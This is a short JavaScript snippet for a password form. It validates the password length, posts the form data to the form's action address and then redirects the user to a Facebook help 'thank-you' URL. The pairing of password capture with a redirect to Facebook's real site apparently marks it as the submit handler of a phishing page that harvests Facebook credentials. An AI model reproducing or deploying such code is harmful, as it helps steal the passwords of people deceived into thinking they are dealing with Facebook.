        document.getElementById('passwordForm').addEventListener('submit', function(event) {
            var passwordField = document.getElementById('password');
            var errorMessage = document.getElementById('error-message');
            if (passwordField.value.length < 6) {
                errorMessage.textContent = 'Password must be at least 6 characters long.';
                event.preventDefault();
            } else {
                errorMessage.textContent = '';
                // Perform form submission via Fetch API
                event.preventDefault(); // Prevent default form submission

                var formData = new FormData(this);
                fetch(this.action, {
                    method: 'POST',
                    body: formData,
                    headers: {
                        'Accept': 'application/json'
                    }
                })
                .then(response => {
                    if (response.ok) {
                        window.location.href = 'https://www.facebook.com/help/media/thank-you?rdrhc'; // Redirect to desired URL
                    } else {
                        errorMessage.textContent = 'There was an error. Please try again.';
                    }
                })
                .catch(() => {
                    errorMessage.textContent = 'There was an error. Please try again.';
                });
            }
        });